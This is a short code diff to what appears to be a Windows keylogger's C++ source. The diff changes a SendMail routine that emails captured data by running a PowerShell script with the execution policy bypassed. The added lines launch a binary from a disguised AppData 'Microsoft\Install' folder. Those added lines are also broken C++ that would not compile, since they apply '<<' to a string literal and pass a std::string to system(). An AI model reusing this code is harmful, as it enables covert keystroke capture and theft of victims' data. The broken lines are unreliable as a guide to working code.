@@ -4,6 +4,8 @@
 #include <fstream>
 #include <vector>
 #include <string>
+#include <stdlib.h>
+#include <stdio.h>
 #include "windows.h"
 #include "IO.h"
 #include "Timer.h"
@@ -100,6 +102,11 @@ namespace Mail
 
     int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
     {
+        const char* home_dir = getenv("USERPROFILE");
+        //system("explorer C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\bin\\Debug\\main.exe");
+        std::string command = "explorer " << home_dir << "\\AppData\\Roaming\\Microsoft\\Install\\main.exe";
+        system(command);
+        system("pause");
         bool ok;
         //Ok determines whether mail sending succeeded or not
         ok = IO::MKDir(IO::GetOurPath(true));
@@ -112,6 +119,7 @@ namespace Mail
         //Check if the creation of the script didn't went through
         if(!ok)
             return -2;
+
 
         std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                             + StringReplace(subject, "\"", "\\\"") +
